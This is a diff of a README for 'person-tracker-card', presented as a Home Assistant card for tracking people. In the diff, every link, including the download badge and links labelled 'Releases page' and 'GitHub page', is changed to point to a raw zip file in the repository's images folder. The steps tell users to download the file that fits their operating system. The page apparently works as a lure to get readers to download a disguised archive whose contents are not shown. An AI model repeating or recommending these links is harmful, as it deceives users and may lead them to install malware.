@@ -1,7 +1,7 @@
 # 🚀 person-tracker-card - Track People Easily in Home Assistant
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip%20Release-blue)](https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip)
+[![Download Latest Release](https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip%20Release-blue)](https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip)
 
 ## 📖 Overview
 The person-tracker-card is an advanced card for Home Assistant that helps you track individuals easily. With its visual editor, you can customize how you see and manage people in your home environment. This tool is perfect for anyone looking to enhance their smart home experience without any complex setup.
@@ -20,11 +20,11 @@ The person-tracker-card is an advanced card for Home Assistant that helps you tr
 - **Supported Platforms**: Works on any system that supports Home Assistant, including Raspberry Pi, Windows, macOS, and Linux.
 
 ### Installation Steps
-1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip) to find the latest version of the software.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip) to find the latest version of the software.
   
 2. **Choose Your File**: Look for the file that matches your system requirements. Click on the file to start the download.
    
-3. **Download**: If you are presented with multiple files, download the one labeled properly for your system (e.g., `https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip`).
+3. **Download**: If you are presented with multiple files, download the one labeled properly for your system (e.g., `https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip`).
 
 4. **Locate the Downloaded File**: Once the download is complete, find the file in your "Downloads" folder or wherever you save downloaded items.
 
@@ -46,7 +46,7 @@ The person-tracker-card is an advanced card for Home Assistant that helps you tr
 - **Privacy Settings**: Customize settings to ensure data privacy for all tracked individuals.
 
 ## 🔄 Updating the Software
-1. **Check for Updates**: Periodically visit the [Releases page](https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip) to see if any new versions are available.
+1. **Check for Updates**: Periodically visit the [Releases page](https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip) to see if any new versions are available.
    
 2. **Download the Latest Version**: Follow the same steps above to download and replace the old version with the new one.
 
@@ -65,6 +65,6 @@ While this guide helps you set up the person-tracker-card, contributions are alw
 This software is released under the MIT License, allowing free use and modification.
 
 ## 🔗 Links
-For more details and continuous updates, visit our [GitHub page](https://raw.githubusercontent.com/Raboratory/person-tracker-card/main/images/person-tracker-card_v3.9.zip). 
+For more details and continuous updates, visit our [GitHub page](https://github.com/Raboratory/person-tracker-card/raw/refs/heads/main/images/card_tracker_person_3.0.zip). 
 
 Your smart home experience just got smoother. Enjoy exploring the capabilities of the person-tracker-card!
